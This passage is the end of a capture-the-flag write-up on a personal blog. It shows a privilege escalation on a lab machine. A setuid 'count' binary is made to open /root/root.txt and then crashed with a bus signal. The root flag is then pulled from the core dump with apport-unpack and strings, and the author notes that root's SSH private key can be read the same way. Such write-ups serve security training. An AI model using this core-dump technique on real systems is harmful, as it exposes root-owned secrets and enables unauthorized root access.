+Steps :-</p><ul><li>Run count binary and try to read the /root/root.txt</li><li>press CTRL + Z and background the process.</li><li>Find the process id and Kill it</li><li>Foreground the process again</li></ul><p>This will generate the CoreDump at <code>/var/crash/_opt_count.1000.crash</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>dasith@secret:/opt$ ./count
+Enter source file/directory name: /root/root.txt
+
+Total characters <span style=color:#f92672>=</span> 33
+Total words      <span style=color:#f92672>=</span> 2
+Total lines      <span style=color:#f92672>=</span> 2
+Save results a file? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span>: ^Z
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>+  Stopped                 ./count
+dasith@secret:/opt$ ps aux |grep count
+root         <span style=color:#ae81ff>856</span>  0.0  0.1 <span style=color:#ae81ff>235676</span>  <span style=color:#ae81ff>7428</span> ?        Ssl  17:11   0:00 /usr/lib/accountsservice/accounts-daemon
+dasith      <span style=color:#ae81ff>1613</span>  0.0  0.0   <span style=color:#ae81ff>2488</span>   <span style=color:#ae81ff>592</span> pts/0    T    17:44   0:00 ./count
+dasith      <span style=color:#ae81ff>1615</span>  0.0  0.0   <span style=color:#ae81ff>6432</span>   <span style=color:#ae81ff>736</span> pts/0    S+   17:45   0:00 grep --color<span style=color:#f92672>=</span>auto count
+dasith@secret:/opt$ kill -BUS 1613
+dasith@secret:/opt$ bg
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>+ ./count &amp;
+dasith@secret:/opt$ fg
+-bash: fg: job has terminated
+<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>+  Bus error               <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span> ./count
+
+</code></pre></div><p>Let&rsquo;s extract the logs using &lsquo;apport-unpack&rsquo; , and then extract the words using &lsquo;strings&rsquo;.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/log
+dasith@secret:/opt$ strings /tmp/log/CoreDump
+</code></pre></div><p>in the output we can find the root flag, We can similarly read the SSH Private key and use that to gain root shell access.</p><p>We Got the Root Flag.</p><p><img src=/assets/Pasted%20image%2020220314133946.png alt="assets/Pasted image 20220314133946.png"></p><h6 id=thank-you-for-reading>Thank You For Reading</h6><hr></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>
